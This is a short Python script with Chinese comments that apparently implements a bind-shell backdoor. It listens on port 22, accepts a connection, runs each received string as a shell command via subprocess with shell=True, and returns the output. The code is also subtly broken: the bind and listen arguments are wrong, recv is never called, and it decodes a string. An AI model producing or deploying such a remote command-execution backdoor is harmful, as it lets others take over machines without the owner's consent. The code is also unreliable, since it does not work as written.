import socket 
import subprocess

HOST='IP'
PORT=22

with socket.socket(socket.AF_INET, socket.SOCK_SEQPACKET) as server_socket:
    #绑定IP端口
    server_socket.bind(HOST,PORT)
    #开始监听
    server_socket.listen(PORT)
    print("等待连接")
    
    conn,addr=server_socket.accept()
    with conn:
        print("连接成功，来自:",addr)
        while True:
            data=conn.recv
            if not data:
                break
            print("接受:",data.decode())
            result=subprocess.run(data.decode(),shell=True,capture_output=True,text=True)
            
            conn.sendall(result.stdout.decode())